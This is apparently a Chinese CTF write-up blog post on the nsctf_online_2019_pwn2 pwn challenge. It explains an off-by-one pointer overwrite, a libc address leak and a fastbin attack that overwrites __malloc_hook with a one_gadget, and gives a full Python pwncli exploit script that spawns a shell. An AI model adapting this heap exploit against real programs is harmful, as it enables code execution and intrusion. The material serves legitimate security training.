# nsctf_online_2019_pwn2



### 总结

直接`off by one`可以修改指针，可以操作的空间非常大。其实觉得这题改改`off by null`，难度可能会高一点，`one by one`的话难度稍微低点。

- 修改指针然后泄露出`libc`的地址
- `fastbin attack`劫持`__malloc_hook`，修改为`one_gadget`获取`shell`

<!-- more -->

### 题目漏洞

溢出`1`字节刚好能修改到指针

![image-20210905231132027](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905231132027.png)

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(size:int):
    p.sendlineafter("6.exit\n", "1")
    p.sendlineafter("Input the size\n", str(size))

def delete():
    p.sendlineafter("6.exit\n", "2")

def show():
    p.sendlineafter("6.exit\n", "3")
    return p.recvline()

def update_name(name):
    p.sendlineafter("6.exit\n", "4")
    p.send(name)


def edit_note(data):
    p.sendlineafter("6.exit\n", "5")
    p.sendafter("Input the note", data)


p.sendafter("Please input your name\n", "lynne")

add(0x1f0)
update_name("\x00" * 0x31)

edit_note(flat({0:[0, 0x101], 0x100:[0, 0x101]}))
update_name("\x10" * 0x31)

delete()

add(0x60)
update_name("\x80" * 0x31)
msg = show()
info("msg recv: {}".format(msg))
libc_base_addr = u64(msg[:-1] + b"\x00\x00") - 0x3c4b78
libc.address = libc_base_addr
log_address("libc_base_addr", libc_base_addr)

update_name("\x10" * 0x31)
delete()

add(0x10)
update_name("\x10" * 0x31)
edit_note(p64(libc.sym['__malloc_hook'] - 0x23))

add(0x60)
payload = flat(["\x00" * 0xb, libc_base_addr + 0x4526a, libc.sym['realloc']+13], filler="\x00")
add(0x60)
edit_note(payload)

add(0x10)

p.interactive()
```

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-05-nsctf-online-2019-pwn2/  

